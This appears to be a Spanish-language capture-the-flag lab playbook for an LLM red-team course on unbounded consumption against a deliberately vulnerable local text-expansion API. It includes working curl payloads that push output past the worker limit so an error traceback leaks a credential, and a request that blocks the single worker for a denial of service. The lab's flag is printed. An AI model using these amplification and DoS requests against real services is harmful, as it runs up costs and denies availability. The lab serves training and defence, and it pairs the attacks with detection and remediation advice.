# 🔴 Lab LLM10 — Unbounded Consumption

> 🌐 **Interfaz web (app real e independiente):** `http://localhost:5010/`
> Cada laboratorio tiene su propia UI, su propio puerto y su propio estado.
>
> 🧭 **Antes de empezar:** sigue la [metodología LLM Red Team](../../docs/metodologia-llm-redteam.md).
> Este playbook **no va directo a la bandera**: te guía por fases con pistas.

## Escenario
`Flux` es una **API de expansión de texto** sin autenticación, sin cuotas y sin
límite de longitud. Una petición pequeña genera **megabytes** de salida
(amplificación → coste/Do **S**). Cuando el "worker" colapsa, el **traceback** de
error filtra la credencial de emergencia (manejo inseguro de errores).

## MITRE ATLAS
- **AML.T0034** — Cost Harvesting (consumo descontrolado)
- **AML.T0029** — Denial of ML Service

---

## 🧭 Paso a paso (con pistas, sin spoilers)

**Objetivo:** provocar el colapso del worker y capturar la credencial que filtra
el error.

### Fase 0 — Prepara
Abre la UI: es una herramienta de "expandir texto". Tiene un cuadro de texto y un
número de repeticiones (`n`).

### Fase 1 — Reconocimiento
El servicio **publicita sus límites** (o la ausencia de ellos). Empieza por ahí.

<details><summary>💡 Pista 1 — ¿Hay algún tope?</summary>

```bash
curl -s http://localhost:5010/metrics
# {"rate_limit": null, "max_tokens_out": null, "auth": null, "limite_worker_chars": ...}
```
`limite_worker_chars` es el número de caracteres a partir del cual el worker
"colapsa". Recuerda ese número.
</details>

### Fase 2 — Hipótesis
El parámetro `n` **no tiene tope**. Si el resultado supera el límite del worker,
el error devolverá un **traceback** que quizá incluya la credencial. Además,
existe un endpoint de "regeneración de índice" con `sleep` largo y sin
concurrencia: un **DoS de disponibilidad**.

<details><summary>💡 Pista 2 — Dos vectores</summary>

1. **Amplificación:** `texto` × `n` supera el límite → error con fuga.
2. **Agotamiento de worker:** `/refresh` bloquea el único worker ~30s → DoS.
</details>

### Fase 3 — Explotación
Consigue superar el límite y lee el traceback.

<details><summary>💡 Pista 3 — Calcular la amplificación</summary>

`len(texto) * n > limite_worker_chars`. Ejemplos: `texto="A"*10, n=100000` →
1.000.000 chars; `texto="x"*500, n=1000` → 500.000; `texto="hola", n=50001` →
200.004. Todos rebasan el límite.
</details>

### Fase 4 — Post-explotación
Documenta dos impactos: **económico** (cada token de salida cuesta dinero) y de
**disponibilidad** (DoS trivial sobre el worker). Nota que la fuga proviene de no
sanear los errores.

---

## 🎯 Payloads que funcionan (varios caminos)

<details><summary>Mostrar payloads (spoiler)</summary>

**A) Amplificación → fuga por traceback:**

```bash
curl -s -X POST http://localhost:5010/expand -H 'Content-Type: application/json' \
  -d '{"texto":"AAAAAAAAAA","n":100000}'

curl -s -X POST http://localhost:5010/expand -H 'Content-Type: application/json' \
  -d '{"texto":"xxxxxxxxxx... (500 x)","n":1000}'

curl -s -X POST http://localhost:5010/expand -H 'Content-Type: application/json' \
  -d '{"texto":"hola","n":50001}'
```

**B) DoS de disponibilidad** (bloquea el worker ~30s):

```bash
curl -s http://localhost:5010/refresh &
curl -s http://localhost:5010/metrics   # se quedará esperando: único worker ocupado
```
</details>

<details><summary>🏁 Bandera (spoiler final)</summary>

`FLAG{rt_llm10_amplificacion_dos}`
</details>

## 🤖 Automatización
```bash
python exploits/exploit.py --target http://localhost:5010
```

## 🛡️ Detección (Blue Team)
- Alertar picos de tokens de salida y de coste por usuario/API key.
- Rate-limiting y cuotas; detectar ráfagas y amplificación (input pequeño →
  output enorme).
- Errores 500 con cuerpos largos (tracebacks) = fuga potencial.

## 🧰 Remediación
- **Límites duros**: `max_tokens`, longitud de entrada, `n` acotado, timeouts.
- **Cuotas y rate-limiting** por usuario/clave; autenticación obligatoria.
- Concurrencia adecuada y *circuit breaker*; errores genéricos sin trazas.
- Nunca en variables de entorno accesibles a código sin privilegios ni en mensajes
  de error.
